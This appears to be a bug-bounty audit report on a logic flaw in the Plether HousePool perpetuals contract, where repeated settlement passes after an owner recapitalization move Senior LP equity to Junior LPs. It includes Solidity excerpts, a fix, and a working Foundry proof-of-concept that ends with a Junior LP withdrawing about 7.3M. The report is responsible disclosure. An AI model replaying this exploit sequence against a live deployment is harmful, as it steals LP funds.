# \#99149 [SC-High] A second settlement pass after a partial owner recapitalization re-bootstraps Senior from the shrinking residual, so Senior LP funds are moved to Junior LPs at constant pool value

**Submitted on Nov 12th 2026 at 05:31:10 UTC by @jh42 for [Audit Competition | Plether](https://immunefi.com/audit-competition/plether)**

- **Report ID:** #99149
- **Report Type:** Smart Contract
- **Report severity:** High
- **Target:** https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/HousePool.sol
- **Impacts:**
  - Direct theft of any user funds, whether at-rest or in-motion, other than unclaimed yield

## Description

## Brief/Intro
After a loss leaves trader claims above pool cash, the owner recapitalizes the pool as the documented runbook says. The recapitalization goes into a pending bucket. The first LP settlement pass can only settle the part that the pool's distributable value backs, so a residual stays in the bucket. Every later pass, even at exactly the same pool value, settles that residual again against value that is already assigned to Senior. The reconcile plan books that value as a loss and writes Senior to zero. The empty-Senior bootstrap then re-credits Senior with only the small residual and overwrites the Senior high-water mark (HWM) with it. Revenue that was queued during the wipe is routed by the lowered HWM, so it goes to Junior. This is a new defect introduced by the fix for the pending-bucket finding, commit `31a38bb7`

Who loses and who gains:
- Senior LPs lose. Alice, an honest Senior LP, goes from a claim of 8,202,795 to 689,661, a loss of 7,513,134 (91.6%).
- Junior LPs gain. Mallory, a Junior LP that the crash had wiped to zero, goes from 0 to 7,513,130 and withdraws 7,340,709 in cash. Any other Junior holder gains in the same way.
- The owner loses. The 8,892,457 recapitalization was meant to restore Senior and mostly ends up with Junior.
- Traders, the treasury and the total pool value are unchanged.

The passes are permissionless and any LP activity triggers them. The trigger is a documented, trusted action (the owner's recapitalization) in the protocol's designed recovery path. No privileged role is malicious.

### Root cause

Three pieces of the pending-bucket logic combine. All of them come from the fix for the pre-audit finding on pending claimant buckets (commit 31a38bb7, 2026-05-08, "Cap pending claimant buckets before reconcile"). That commit added the cap against distributable, the carve-out of the settleable buckets (a later refactor moved it into the plan library), the decrement of only the settled part of each bucket, and the bootstrap change from `seniorHighWaterMark = remaining` to `max(target, remaining)` fed with the stored bucket. The finding it fixed was a missing cap that over-credited principal. This report is a new defect created by the fix, not the original one.

1. The cap is measured against total distributable, which already contains the principal assigned by the previous pass. Only the settled part leaves the bucket, so the remainder is settled again on the next pass.

```solidity
// HousePool.sol:1829-1834
function _settleablePendingClaimantBuckets(
    HousePoolAccountingLib.ReconcileSnapshot memory reconcileSnapshot,
    HousePoolPendingPreviewLib.ClaimantPendingBuckets memory claimantBuckets
) internal pure returns (HousePoolPendingPreviewLib.ClaimantPendingBuckets memory settleableClaimantBuckets) {
    return HousePoolPendingPreviewLib.capClaimantBuckets(claimantBuckets, reconcileSnapshot.distributable);
}

// HousePool.sol:1787-1792
function _decreasePendingClaimantBuckets(
    HousePoolPendingPreviewLib.ClaimantPendingBuckets memory claimantBuckets
) internal {
    pendingRecapitalizationAssets -= claimantBuckets.recapitalizationAssets;   // settled part only
    pendingTradingRevenueAssets -= claimantBuckets.revenueAssets;
}
```

2. The reconcile plan carves the settleable buckets out of distributable before it compares the rest with the stored principals. When the buckets consume all of distributable, stored Senior principal is booked as a loss and written to zero in the same pass, although it was never lost.

```solidity
// HousePoolReconcilePlanLib.sol:68-71
if (pendingBucketAssets > 0) {
    snapshot.distributable =
        snapshot.distributable > pendingBucketAssets ? snapshot.distributable - pendingBucketAssets : 0;
}

// HousePoolReconcilePlanLib.sol:103 calls absorbLoss, HousePoolWaterfallAccountingLib.sol:167-184
function absorbLoss(WaterfallState memory state, uint256 lossAssets) internal pure returns (WaterfallState memory nextState) {
    nextState = state;
    if (lossAssets <= nextState.juniorPrincipal) {
        nextState.juniorPrincipal -= lossAssets;
        return nextState;
    }
    uint256 seniorLoss = lossAssets - nextState.juniorPrincipal;
    nextState.juniorPrincipal = 0;
    if (nextState.seniorPrincipal > seniorLoss) {
        nextState.seniorPrincipal -= seniorLoss;
    } else {
        nextState.seniorPrincipal = 0;      // Senior is wiped
    }
}
```

3. The empty-Senior bootstrap then fires on the principal that the plan itself just zeroed, and it overwrites the HWM with the remaining bucket, which shrinks on every pass. The live caller passes the stored (already shrunk) bucket as the intent.

```solidity
// HousePoolPendingPreviewLib.sol:117-123 (applyClaimantRecapitalizationIntent)
if (state.waterfall.seniorPrincipal == 0 && state.waterfall.juniorPrincipal == 0) {
    state.waterfall.seniorPrincipal += remaining;
    state.waterfall.seniorHighWaterMark =
        recapitalizationTargetAssets > remaining ? recapitalizationTargetAssets : remaining;   // overwrite, may lower
    remaining = 0;
}

// HousePool.sol:1759-1776 (_applyPendingClaimantBucketsLive): `claimantBuckets` is the stored bucket
HousePoolPendingPreviewLib.applyPendingClaimantBucketsPreview(
    state, settleableClaimantBuckets, claimantBuckets, allowRevenueContinuation
);
_decreasePendingClaimantBuckets(settleableClaimantBuckets);
```

With the HWM equal to principal, the Senior gap is zero, so the queued revenue that is applied next goes to Junior:

```solidity
// HousePoolPendingPreviewLib.sol:158-188 (applyRevenueIntent)
uint256 remaining = amount;
if (state.seniorSupply > 0) {
    uint256 gap = state.waterfall.seniorHighWaterMark > state.waterfall.seniorPrincipal
        ? state.waterfall.seniorHighWaterMark - state.waterfall.seniorPrincipal
        : 0;
    if (gap > 0) {                                  // gap is 0 after the overwrite
        uint256 seniorAssignedAssets = remaining > gap ? gap : remaining;
        state.waterfall.seniorPrincipal += seniorAssignedAssets;
        remaining -= seniorAssignedAssets;
    }
}
if (remaining > 0 && state.juniorSupply > 0) {
    state.waterfall.juniorPrincipal += remaining;   // everything lands here
    remaining = 0;
}
```

The first bootstrap after a wipe resets the HWM to the recapitalization. That is intended and tested (TrancheRecoveryBehavior.t.sol:23-53 asserts "Explicit recapitalization should reset the HWM"). The defect is that every later pass at unchanged value runs the same bootstrap again with a smaller target. That contradicts the project's own rules:

- ACCOUNTING_SPEC.md:337: "Charge a shortfall to Junior first, then Senior. Losses do not reduce the Senior high-water mark."
- ACCOUNTING_SPEC.md:642: "Normal reconciliation allocates the queued amount to senior restoration or unassigned assets."

A second pass over an unchanged pool must be a no-op.

### Impact

Release parameters, one recovery, price path 1.0 to 1.95 to 0.05, two permissionless passes at unchanged cash (all numbers from the single PoC below):

- Alice, honest Senior LP, deposited 15.9M. Her claim before the passes is 8,202,795.12 and after the passes 689,661.39 (a loss of 91.6%).
- Mallory, Junior LP, deposited 4.0M and was wiped to zero by the loss. Her claim before the passes is 0 and after the passes 7,513,130.44. She withdraws 7,340,709.09 as cash in the next epoch, which is more than her original 4.0M deposit even though the pool lost most of its value.
- Pool cash, which equals LP equity, is 8,202,795.63 before and 8,202,793.75 after. Pool cash differs by 1.88 USDG between the two readings, which does not affect the comparison.

The amounts balance: the 7,513,133.73 that Alice loses is what Mallory gains. The waterfall assigns all of this equity to Senior, because it is smaller than both the pre-wipe HWM (15.9M) and the HWM after the intended first reset (8.89M). Junior should receive nothing. After a loss that wipes both tranches, the remaining equity should go to Senior first. The second pass reverses that priority.

- Theft of principal. The amount moved is a fraction of the equity that exists when the passes run, and the fraction can reach almost all of it. It is not bounded by a small rounding amount.
- Permissionless. A dust Junior redeem that is refunded at zero value counts as LP epoch progress, so anyone can tick the pool. Honest LP activity triggers the same passes.
- No privileged role is malicious, there is no oracle manipulation by the attacker, and no non-default parameter is used.
- Trust model. "In scope: a legitimate, documented action by a trusted role that triggers a bug harming users or the protocol." The owner's recapitalization is that action. The recapitalization amount is an action input, not a parameter setting.

Requirements, with the code that defines each:

(1) Trader claims exceed pool cash. The engine records a payout as a claim when it exceeds cash, and WHITEPAPER.md section 2.3 describes the sequential path that reaches this state ("if Long closes at p=0 and is credited 1, then Short remains open and later closes at p=2, cumulative realized price-PnL obligations equal 2. The second obligation may be a trader claim rather than an immediate cash payment").

```solidity
// CfdEngine.sol:840-857
function _payOrRecordTraderClaim(address account, uint256 amountAssets, bool positionRemainsOpen) internal {
    if (amountAssets == 0) { return; }
    if (_canPayFreshPoolPayout(amountAssets)) {
        _payTraderClaim(account, amountAssets, positionRemainsOpen);
    } else {
        _advanceAllCarryIndexes(block.timestamp);
        traderClaimBalanceAssets[account] += amountAssets;
        totalTraderClaimBalanceAssets += amountAssets;
        emit TraderClaimRecorded(account, amountAssets);
    }
}
```

(2) The owner recapitalizes with an amount that the first pass cannot settle in full. This is the documented recovery: SECURITY.md:155-161 describes `recapitalizePool` as "an immediate, owner-only, non-reentrant recovery action", and the runbook at SECURITY.md:1505-1511 lists "Recapitalize or clear positions" and then "Clear degraded mode only after raw solvency E >= L is genuinely restored".

(3) Revenue, such as a trader's loss, arrives while the stored principals are zero and is queued instead of applied.

```solidity
// HousePool.sol:644-648 (recordClaimantInflow)
if (kind == IHousePool.ClaimantInflowKind.Recapitalization) {
    _recordPendingClaimantInflow(kind, amount);
} else if (seniorPrincipal + juniorPrincipal == 0) {
    _recordPendingClaimantInflow(kind, amount);     // revenue is queued while stored principals are zero
}
```

(4) No matured Senior redeem request is pending

### How the Senior value reaches Junior cash

Let R be the residual recapitalization bucket, V the residual queued revenue bucket and d the distributable value (cash minus trader claims, no open positions). While a claim is outstanding, d is below R + V, so every pass settles all of d from the buckets. In a pass where R + V is at least d and R is above zero, the result is:

```
Senior   = min(R, d)
HWM      = R                     (overwritten, previously the earlier residual)
Junior   = min(V, d - Senior)
```

A pass at unchanged pool value should leave tranche ownership unchanged. It does not:

```
after pass 1:  Senior = 8,202,795.63  Junior = 0              HWM = 8,892,457.06  R = 689,661.43  V = 7,683,650.30
after pass 2:  Senior =   689,661.43  Junior = 7,513,132.32   HWM =   689,661.43  R = 0           V =   170,516.10
```

Anyone can run the passes. A dust Junior redeem is refunded at zero value and counts as LP-epoch progress:

```solidity
// HousePool.sol:960-986 (condensed)
if (fullHeadAssets == 0) {
    ...
    if (vault.refundRedeemEpochRemainder(epochId, remainingShares) != remainingShares) {
        revert HousePool__VaultSettlementInvariant();
    }
    ...
    phase.processedEpochs += 1;     // counts as progress, so the pass does not revert and the reconcile is persisted
    continue;
}
```


### Who loses and who gains

- Senior LPs lose. Alice's claim falls from 8,202,795.12 to 689,661.39, a loss of 7,513,133.73 (91.6%). The waterfall pays Senior first, so all of this equity is hers. The plan writes her principal to zero, the bootstrap re-credits only the small residual, and the lowered HWM no longer records what she is owed. The loss is permanent once Junior withdraws the cash.
- The owner loses. The 8,892,457.06 recapitalization was meant to restore Senior. Senior ends with 689,661.39 of it.
- Junior LPs gain. Mallory's claim rises from 0 to 7,513,130.44 and she withdraws 7,340,709.09 as cash, more than her original 4.0M deposit even though the crash wiped her to zero. With the HWM lowered to Senior's principal there is no Senior gap left, so the queued 7,683,650.30 of revenue goes to Junior. Any Junior holder gains in proportion to its Junior shares.
- Nobody else changes. The traders keep their payouts and losses, the treasury is unaffected, and total pool value is the same.
- Anyone can cause it. The passes are permissionless, and only Junior holders benefit.

### User story

1. Alice deposits 15.9M USDG in the Senior tranche. Mallory deposits 4.0M in the Junior tranche. The pool holds 19.9M and runs the release parameters.
2. Two traders build a balanced book, each 15M notional at price 1.0, fully margined. The price rises to 1.95 and the short is paid 14.25M in cash. The price falls to 0.05 and the long's 14.25M payout exceeds the remaining cash, so the engine records it as a claim. The deficit D is 8,373,311.74. Mallory's Junior shares are worth zero.
3. The owner follows the runbook: it clears degraded mode (no open liability remains) and a pass persists the wipe. Stored principals are zero.
4. The owner recapitalizes 8,892,457.06, slightly above D.
5. Trading resumes. A trader opens a long at 0.05 and closes at 1.9. The loss, 7,683,650.30, is booked as pool revenue and queued, because stored principals are zero. The long's claim is paid in cash. LP equity is 8,202,795.63, all of it Alice's by the waterfall.
6. Anyone ticks two LP epochs. Alice's claim falls to 689,661.39 and Mallory's rises to 7,513,130.44.
7. Mallory redeems her Junior shares and withdraws 7,340,709.09 USDG.

### Recommendation

Feed the original recapitalization intent, not the stored (shrinking) remainder, as the bootstrap target. Keep the original target while the bucket drains and clear it when the bucket reaches zero. This keeps the intended first reset and makes later passes at unchanged value no-ops. The diff below was applied to a scratch copy of the real contracts:

```diff
--- a/packages/perps/src/HousePool.sol
+++ b/packages/perps/src/HousePool.sol
@@ -159,6 +159,8 @@
     uint256 public pendingRecapitalizationAssets;
     /// @notice Unsettled claimant trading revenue reserved from withdrawals (6-decimal settlement token).
     uint256 public pendingTradingRevenueAssets;
+    /// @notice Original recapitalization intent of the current pending bucket; cleared when the bucket drains.
+    uint256 public pendingRecapitalizationTargetAssets;
@@ -1670,7 +1672,7 @@
         HousePoolPendingPreviewLib.applyPendingClaimantBucketsPreview(
-            pendingState, settleableClaimantBuckets, claimantBuckets, allowRevenueContinuation
+            pendingState, settleableClaimantBuckets, _claimantIntentBuckets(claimantBuckets), allowRevenueContinuation
         );
@@ -1767,7 +1769,7 @@
         HousePoolPendingPreviewLib.applyPendingClaimantBucketsPreview(
-            state, settleableClaimantBuckets, claimantBuckets, allowRevenueContinuation
+            state, settleableClaimantBuckets, _claimantIntentBuckets(claimantBuckets), allowRevenueContinuation
         );
@@ -1789,14 +1791,27 @@
         pendingRecapitalizationAssets -= claimantBuckets.recapitalizationAssets;
         pendingTradingRevenueAssets -= claimantBuckets.revenueAssets;
+        if (pendingRecapitalizationAssets == 0) {
+            pendingRecapitalizationTargetAssets = 0;
+        }
     }
 
+    function _claimantIntentBuckets(
+        HousePoolPendingPreviewLib.ClaimantPendingBuckets memory claimantBuckets
+    ) internal view returns (HousePoolPendingPreviewLib.ClaimantPendingBuckets memory intentBuckets) {
+        intentBuckets = claimantBuckets;
+        if (pendingRecapitalizationTargetAssets > intentBuckets.recapitalizationAssets) {
+            intentBuckets.recapitalizationAssets = pendingRecapitalizationTargetAssets;
+        }
+    }
+
@@ -1799,6 +1814,7 @@
         if (kind == IHousePool.ClaimantInflowKind.Recapitalization) {
             pendingRecapitalizationAssets += amount;
+            pendingRecapitalizationTargetAssets += amount;
         } else {
```

Results with this patch (scratch copy, the repository files are untouched):

- The PoC below no longer reproduces. It fails at its first exploit assertion ("Alice loses more than 90% of her claim") because after two passes Alice's claim stays at 8,202,795.12, Junior stays at 0, and the HWM stays at the recapitalization, 8,892,457.06.

## References

- HousePool.sol, cap against distributable: https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/HousePool.sol#L1829-L1834
- HousePool.sol, live bucket application and decrement of the settled part only: https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/HousePool.sol#L1759-L1792
- HousePool.sol, revenue queued while stored principals are zero: https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/HousePool.sol#L644-L648
- HousePool.sol, dust refund counts as LP epoch progress: https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/HousePool.sol#L957-L987
- HousePoolReconcilePlanLib.sol, carve-out of the settleable buckets: https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/libraries/HousePoolReconcilePlanLib.sol#L68-L71
- HousePoolWaterfallAccountingLib.sol, absorbLoss: https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/libraries/HousePoolWaterfallAccountingLib.sol#L167-L184
- HousePoolPendingPreviewLib.sol, capClaimantBuckets: https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/libraries/HousePoolPendingPreviewLib.sol#L72-L82
- HousePoolPendingPreviewLib.sol, bootstrap overwrite of the HWM: https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/libraries/HousePoolPendingPreviewLib.sol#L117-L123
- HousePoolPendingPreviewLib.sol, revenue routing: https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/libraries/HousePoolPendingPreviewLib.sol#L158-L188
- CfdEngine.sol, claim recorded when the payout exceeds cash: https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/CfdEngine.sol#L840-L857
- ACCOUNTING_SPEC.md, losses do not reduce the Senior HWM: https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/ACCOUNTING_SPEC.md?plain=1#L337
- ACCOUNTING_SPEC.md, queued amount goes to Senior restoration: https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/ACCOUNTING_SPEC.md?plain=1#L642
- SECURITY.md, owner-funded recapitalization: https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/SECURITY.md?plain=1#L155-L161
- SECURITY.md, recovery runbook: https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/SECURITY.md?plain=1#L1505-L1511
- WHITEPAPER.md, section 2.3 sequential path: https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/WHITEPAPER.md?plain=1#L255-L300
- TrancheRecoveryBehavior.t.sol, intended first HWM reset: https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/test/perps/accounting/waterfall/TrancheRecoveryBehavior.t.sol#L23-L53
- Commit that introduced the cap, carve-out and bootstrap change: https://github.com/immunefi-team/audit-comp-plether/commit/31a38bb7


## Proof of Concept


## Proof of Concept

```bash
forge test --root packages/perps --match-path test/perps/RecapPassReplay.t.sol -vv
```

Save as `packages/perps/test/perps/RecapPassReplay.t.sol`.

```solidity
// SPDX-License-Identifier: AGPL-3.0
pragma solidity 0.8.35;

import {BasePerpTest} from "./BasePerpTest.sol";
import {CfdTypes} from "@plether/perps/CfdTypes.sol";

/// @dev Release risk parameters and release Senior limits. No storage writes, no token burns. Orders enter through the
///      Router-gated engine entrypoint exactly as the other tests in this directory do (BasePerpTest._open/_close).
///      The only exogenous input is the price path.
contract RecapPassReplayPoC is BasePerpTest {

    address internal constant ALICE = address(0xA11CE); // honest Senior LP
    address internal constant MALLORY = address(0xBAD1); // Junior LP; wiped to zero by the loss
    address internal constant CAROL = address(0xCA201); // dust Junior holder used to tick LP epochs
    address internal constant LONG_TRADER = address(0xB0B1); // profits when the price falls; payout becomes a claim
    address internal constant SHORT_TRADER = address(0xB0B2); // profits when the price rises; paid in cash
    address internal constant LOSS_TRADER = address(0xB0B3); // opens after the recap and loses: queued revenue

    function _riskParams() internal pure override returns (CfdTypes.RiskParams memory) {
        return CfdTypes.RiskParams({
            vpiFactor: 0.01e18,
            maxSkewRatio: 0.4e18,
            maintMarginBps: 10,
            initMarginBps: 20,
            fadMarginBps: 300,
            baseCarryBps: 500,
            minBountyAssets: 1e6,
            bountyBps: 10,
            keeperShareBps: 5000,
            protocolShareBps: 0
        });
    }

    function _initialJuniorSeedDeposit() internal pure override returns (uint256) {
        return 1e6;
    }

    function _initialSeniorSeedDeposit() internal pure override returns (uint256) {
        return 1e6;
    }

    function _initialJuniorDeposit() internal pure override returns (uint256) {
        return 0;
    }

    function _initialSeniorDeposit() internal pure override returns (uint256) {
        return 0;
    }

    function test_RecapPassReplay_movesSeniorEquityToJunior() public {
        // ---- Pool at the release limits: Senior is 80% of tranche capital, 1 USDC seeds ----
        _setSeniorCapacity(40_000_000e6, 8000);
        _fundJunior(MALLORY, 4_000_000e6);
        _fundJunior(CAROL, 1e6);
        _fundSenior(ALICE, 15_900_000e6);
        vm.warp(vm.getBlockTimestamp() + 2 hours);

        // ---- 1. Whitepaper section 2.3 sequential path, two ordinary fully margined traders ----
        // LONG profits when the price falls, SHORT when it rises. Net skew stays below 0.4 x depth at every step.
        _fundTrader(LONG_TRADER, 20_000_000e6);
        _fundTrader(SHORT_TRADER, 20_000_000e6);
        _open(LONG_TRADER, CfdTypes.Side.LONG, 7_500_000e18, 7_500_000e6, 1e8);
        _open(SHORT_TRADER, CfdTypes.Side.SHORT, 7_500_000e18, 7_500_000e6, 1e8);
        _open(LONG_TRADER, CfdTypes.Side.LONG, 7_500_000e18, 7_500_000e6, 1e8);
        _open(SHORT_TRADER, CfdTypes.Side.SHORT, 7_500_000e18, 7_500_000e6, 1e8);
        vm.warp(vm.getBlockTimestamp() + 1);
        _close(SHORT_TRADER, CfdTypes.Side.SHORT, 15_000_000e18, 1.95e8); // paid 14.25M in cash
        vm.warp(vm.getBlockTimestamp() + 1);
        _close(LONG_TRADER, CfdTypes.Side.LONG, 15_000_000e18, 0.05e8); // 14.25M payout exceeds cash -> claim

        uint256 deficit = engine.totalTraderClaimBalanceAssets() - pool.totalAssets();
        assertEq(engine.traderClaimBalanceAssets(LONG_TRADER), 14_250_000e6, "the payout was recorded as a claim");
        assertGt(deficit, 8_000_000e6, "claims exceed cash by more than 8M");

        // ---- 2. Documented recovery: clear the latch (no open liability left); a pass persists the wipe ----
        engine.clearDegradedMode();
        assertTrue(_tickEpoch(), "wipe pass");
        assertEq(pool.seniorPrincipal() + pool.juniorPrincipal(), 0, "stored principals are zero");

        // ---- 3. Documented recovery: the owner recapitalises slightly above the deficit ----
        uint256 headroom = (deficit * 620) / 10_000;
        settlementToken.mint(address(this), deficit + headroom);
        settlementToken.approve(address(engine), deficit + headroom);
        engine.recapitalizePool(deficit + headroom);

        // ---- 4. Trading resumes. A trader opens a long at 0.05 and loses at 1.9: the loss is revenue, and it is
        //         queued because stored principals are zero. The winning long's claim is then paid in cash. ----
        uint256 lossSize = (((headroom / 1e6) * 8) / 100) * 100 * 1e18;
        _fundTrader(LOSS_TRADER, 20_000_000e6);
        vm.warp(vm.getBlockTimestamp() + 1);
        _open(LOSS_TRADER, CfdTypes.Side.LONG, lossSize, 12_000_000e6, 0.05e8);
        vm.warp(vm.getBlockTimestamp() + 1);
        _close(LOSS_TRADER, CfdTypes.Side.LONG, lossSize, 1.9e8);
        vm.prank(LONG_TRADER);
        engine.settleTraderClaim(LONG_TRADER);

        uint256 cash = pool.totalAssets();
        uint256 aliceBefore = seniorVault.convertToAssets(seniorVault.balanceOf(ALICE));
        assertEq(engine.totalTraderClaimBalanceAssets(), 0, "no claim is outstanding");
        assertGt(pool.pendingTradingRevenueAssets(), 7_000_000e6, "the trader's loss is queued as revenue");
        assertGt(pool.pendingRecapitalizationAssets(), cash, "the recapitalisation bucket exceeds LP equity");
        assertApproxEqAbs(aliceBefore, cash, 1e6, "all LP equity belongs to Alice (Senior-first waterfall)");
        assertEq(juniorVault.convertToAssets(juniorVault.balanceOf(MALLORY)), 0, "Mallory is worth zero");

        // ---- 5. Two permissionless epoch passes at unchanged pool value ----
        assertTrue(_tickEpoch(), "pass 1");
        assertApproxEqAbs(pool.seniorPrincipal(), cash, 1e6, "after pass 1 stored Senior principal is all LP equity");
        assertEq(pool.juniorPrincipal(), 0, "after pass 1 Junior is still zero");
        _logState("after pass 1");
        assertTrue(_tickEpoch(), "pass 2");
        _logState("after pass 2");
        assertApproxEqAbs(pool.totalAssets(), cash, 2e6, "pool value is unchanged");

        uint256 aliceAfter = seniorVault.convertToAssets(seniorVault.balanceOf(ALICE));
        uint256 malloryAfter = juniorVault.convertToAssets(juniorVault.balanceOf(MALLORY));
        emit log_named_decimal_uint("pool cash = LP equity", cash, 6);
        emit log_named_decimal_uint("Alice claim before the passes", aliceBefore, 6);
        emit log_named_decimal_uint("Alice claim after the passes ", aliceAfter, 6);
        emit log_named_decimal_uint("Mallory claim after the passes", malloryAfter, 6);
        assertLt(aliceAfter, aliceBefore / 10, "Alice loses more than 90% of her claim at constant pool value");
        assertGt(malloryAfter, 7_000_000e6, "Mallory, worth zero before, now holds over 7M of Alice's equity");

        // ---- 6. Mallory takes the cash out through the normal queue ----
        uint256 malloryShares = juniorVault.balanceOf(MALLORY);
        vm.prank(MALLORY);
        uint256 requestId = juniorVault.requestRedeem(malloryShares, MALLORY, MALLORY);
        vm.warp(pool.lpEpochStart(requestId));
        _refreshMark();
        _settleLpEpochForTest();
        uint256 claimable = juniorVault.claimableRedeemRequest(requestId, MALLORY);
        vm.prank(MALLORY);
        juniorVault.claimRedeem(requestId, claimable, MALLORY, MALLORY);
        uint256 malloryCash = settlementToken.balanceOf(MALLORY);
        emit log_named_decimal_uint("Mallory cash withdrawn        ", malloryCash, 6);
        assertGt(malloryCash, 7_000_000e6, "Mallory withdrew over 7M in cash");
    }

    /// @dev A dust Junior redeem is refunded at zero value and counts as LP-epoch progress (HousePool.sol#L957-L987).
    function _tickEpoch() internal returns (bool progressed) {
        uint256 unlock = juniorVault.lastDepositTime(CAROL) + juniorVault.DEPOSIT_COOLDOWN();
        if (vm.getBlockTimestamp() < unlock) {
            vm.warp(unlock);
        }
        uint256 carolShares = juniorVault.balanceOf(CAROL);
        vm.prank(CAROL);
        uint256 requestId = juniorVault.requestRedeem(carolShares, CAROL, CAROL);
        vm.warp(pool.lpEpochStart(requestId));
        _refreshMark();
        try pool.settleLpEpoch(0, 0) {
            progressed = true;
        } catch {}
        if (juniorVault.claimableRedeemRequest(requestId, CAROL) == 0) {
            vm.prank(CAROL);
            try juniorVault.claimRedeemRefund(requestId, CAROL, CAROL) {} catch {}
        }
    }

    function _logState(
        string memory tag
    ) internal {
        emit log_string(tag);
        emit log_named_decimal_uint("  Senior principal   ", pool.seniorPrincipal(), 6);
        emit log_named_decimal_uint("  Junior principal   ", pool.juniorPrincipal(), 6);
        emit log_named_decimal_uint("  Senior HWM         ", pool.seniorHighWaterMark(), 6);
        emit log_named_decimal_uint("  pending recap      ", pool.pendingRecapitalizationAssets(), 6);
        emit log_named_decimal_uint("  pending revenue    ", pool.pendingTradingRevenueAssets(), 6);
        emit log_named_decimal_uint("  pool cash          ", pool.totalAssets(), 6);
    }

    function _refreshMark() internal {
        uint256 price = engine.lastMarkPrice();
        vm.prank(address(router));
        engine.updateMarkPrice(price, uint64(vm.getBlockTimestamp()));
    }

}
```

### Output

```
Ran 1 test for test/perps/RecapPassReplay.t.sol:RecapPassReplayPoC
[PASS] test_RecapPassReplay_movesSeniorEquityToJunior() (gas: 8256699)
Logs:
  after pass 1
    Senior principal   : 8202795.631375
    Junior principal   : 0.000000
    Senior HWM         : 8892457.063745
    pending recap      : 689661.432370
    pending revenue    : 7683650.303737
    pool cash          : 8202795.631375
  after pass 2
    Senior principal   : 689661.432370
    Junior principal   : 7513132.320723
    Senior HWM         : 689661.432370
    pending recap      : 0.000000
    pending revenue    : 170516.104732
    pool cash          : 8202793.753093
  pool cash = LP equity: 8202795.631375
  Alice claim before the passes: 8202795.115123
  Alice claim after the passes : 689661.388966
  Mallory claim after the passes: 7513130.443690
  Mallory cash withdrawn        : 7340709.089784
Suite result: ok. 1 passed; 0 failed; 0 skipped; finished in 11.61ms (6.58ms CPU time)
```

